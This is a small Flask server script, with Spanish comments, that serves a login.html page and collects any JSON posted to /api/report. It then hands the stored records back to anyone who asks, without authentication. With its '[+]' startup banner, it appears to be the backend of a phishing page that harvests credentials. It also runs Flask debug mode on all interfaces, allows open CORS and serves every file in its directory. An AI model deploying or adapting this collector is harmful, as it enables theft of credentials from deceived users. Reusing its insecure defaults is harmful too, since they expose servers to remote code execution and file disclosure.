from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import time
import os
import socket

app = Flask(__name__, static_folder='.', static_url_path='')
CORS(app)

users_data = []

@app.route('/api/report', methods=['POST'])
def report():
    data = request.json
    data['timestamp'] = time.time()
    users_data.append(data)
    return jsonify({'status': 'ok'})

@app.route('/api/report', methods=['GET'])
def get_users():
    return jsonify(users_data)

@app.route('/')
def root():
    return send_from_directory('.', 'login.html')

@app.route('/<path:path>')
def serve_file(path):
    return send_from_directory('.', path)

if __name__ == '__main__':
    if os.environ.get("WERKZEUG_RUN_MAIN") == "true":  # Solo imprime después del reinicio
        local_ip = socket.gethostbyname(socket.gethostname())
        print("\n[+] Accede a la web desde:")
        print(f"   -> http://127.0.0.1:80")
        print(f"   -> http://{local_ip}:80\n")

    app.run(host='0.0.0.0', port=80, debug=True)
